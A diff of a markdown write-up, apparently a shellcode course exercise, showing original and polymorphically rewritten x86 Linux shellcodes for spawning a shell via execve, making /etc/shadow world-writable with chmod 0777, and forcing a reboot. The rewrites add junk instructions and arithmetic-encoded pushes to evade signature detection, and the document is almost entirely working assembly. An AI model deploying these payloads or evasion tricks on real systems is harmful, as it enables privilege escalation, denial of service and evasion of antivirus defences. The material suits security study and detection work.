@@ -30,29 +30,30 @@ lea eax, [eax + 0x00]
 * Add instructions without effect (e.g.: modify registers that don't affect the execution flow)
 * Switch between _`mov`_, _`push`_ + _`pop`_, _`clear`_ + _`add`_:
 
-mov	| push + pop	| clear + add
-:---:|:---:|:---:
-mov al, 0xb	| push byte 0xb	| xor eax, eax
-  -| pop eax	| add al, 0xb
+| mov	| push + pop	| clear + add |
+| :---:|:---:|:---: |
+| mov al, 0xb	| push byte 0xb	| xor eax, eax|
+| _ | pop eax	| add al, 0xb Z
 
 * Switch between _`push`_ and _`mov`_ + _`add`_ + _`push`_:
 
-push	| mov + add + push
-:---:|:---:
-push 0x23456789	| mov esi, 0x12345678
-  - | add esi, 0x11111111
-  - | push esi
+| push	| mov + add + push |
+| :---:|:---: |
+| push 0x23456789	| mov esi, 0x12345678 |
+| _ | add esi, 0x11111111 |
+| _ | push esi |
 
 * Change between _`push`_ and directly accessing the stack:
 
-push	| stack access
-:---:|:---:
-push 0x64777373	| mov dword [esp-4], 0x64777373
-  - | sub esp, 4
+| push	| stack access |
+| :---:|:---:|
+| push 0x64777373	| mov dword [esp-4], 0x64777373 |
+| _ | sub esp, 4 |
 
-## Execve()
+## 1. Execve()
 
-First one is a polymorphic version of the execve() of the following shellcode: 
+First one is a polymorphic version of the _**`execve()`**_ of the following [shellcode](http://shell-storm.org/shellcode/files/shellcode-549.php): 
+```c
     00000000  31C0              xor eax,eax
     00000002  31DB              xor ebx,ebx
     00000004  31C9              xor ecx,ecx
@@ -72,7 +73,10 @@ First one is a polymorphic version of the execve() of the following shellcode:
     00000026  31C0              xor eax,eax
     00000028  B001              mov al,0x1
     0000002A  CD80              int 0x80
+```
+
 And my changed version : 
+```c
     xor eax,eax
     mov ebx, eax            ; xor ebx,ebx
     mov ecx, ebx            ; xor ecx,ecx
@@ -99,10 +103,14 @@ And my changed version :
     xor eax,eax
     mov al,0x1
     int 0x80                ; exit()
+```
 
-I've changed how registers are zeroed and how values were pushed on the stack and added some instructions with no effect. 
-Chmod /etc/shadow
- The next shellcode changes the permissions of /etc/shadow file: 
+I've changed how registers are zeroed and how values were pushed on the stack and added some instructions with no effect.
+
+## 2. Chmod /etc/shadow
+
+The next [shellcode](http://shell-storm.org/shellcode/files/shellcode-828.php) changes the permissions of _`/etc/shadow`_ file: 
+```c
 xor    %eax,%eax
 push   %eax
 pushl  $0x776f6461
@@ -125,41 +133,45 @@ movl   %esp,%ecx
 mov    %eax,%edx
 mov    $0xb,%al
 int    $0x80
+```
+
 And my changed version: 
-    xor eax,eax
-    push eax
-    push dword 0x776f6461
-    mov esi, 0x56611d1d         ; push dword 0x68732f2f
-    lea edi, [esi]              ; junk
-    add esi, 0x12121212
-    push esi
-    push dword 0x6374652f       ; '/etc/shadow'
-    mov esi,esp
-    push eax
-    push dword 0x37373730       ; 0777
-    mov ebp,esp
-    push eax
-    push dword 0x646f6d68
-    mov edi, 0x030f0e09         ; push dword 0x632f6e69       
-    add edi, 0x60206060
-    push edi
-    push word 0x622f            ; /bin/chmod
-    mov ebx,esp
-    push eax
-    push esi
-    push ebp
-    push ebx
-    mov ecx,esp
-    mov edx,eax
-    xor eax, eax                ; mov al,0xb
-    add al, 0xa
-    add al, 0x1
-    xchg ecx, ecx               ; NOP added
-    int 0x80
+```c
+xor eax,eax
+push eax
+push dword 0x776f6461
+mov esi, 0x56611d1d         ; push dword 0x68732f2f
+lea edi, [esi]              ; junk
+add esi, 0x12121212
+push esi
+push dword 0x6374652f       ; '/etc/shadow'
+mov esi,esp
+push eax
+push dword 0x37373730       ; 0777
+mov ebp,esp
+push eax
+push dword 0x646f6d68
+mov edi, 0x030f0e09         ; push dword 0x632f6e69       
+add edi, 0x60206060
+push edi
+push word 0x622f            ; /bin/chmod
+mov ebx,esp
+push eax
+push esi
+push ebp
+push ebx
+mov ecx,esp
+mov edx,eax
+xor eax, eax                ; mov al,0xb
+add al, 0xa
+add al, 0x1
+xchg ecx, ecx               ; NOP added
+int 0x80
+```
 
-
-Reboot
-Last one is a reboot shellcode: 
+## 3. Reboot
+Last one is a [reboot shellcode](http://shell-storm.org/shellcode/files/shellcode-69.php): 
+```c
 8048054:       31 c0                   xor    %eax,%eax
 8048056:       50                      push   %eax
 8048057:       68 62 6f 6f 74          push   $0x746f6f62
@@ -172,7 +184,10 @@ Last one is a reboot shellcode:
 804806c:       89 e1                   mov    %esp,%ecx
 804806e:       b0 0b                   mov    $0xb,%al
 8048070:       cd 80                   int    $0x80
+```
+
 And my modified version: 
+```c
     xor eax,eax
     push eax
     push dword 0x746f6f62
@@ -189,7 +204,7 @@ And my modified version:
     pop eax
     add al, 1                ; mov al,0xb
     int 0x80
-
+```
 
 ##
 
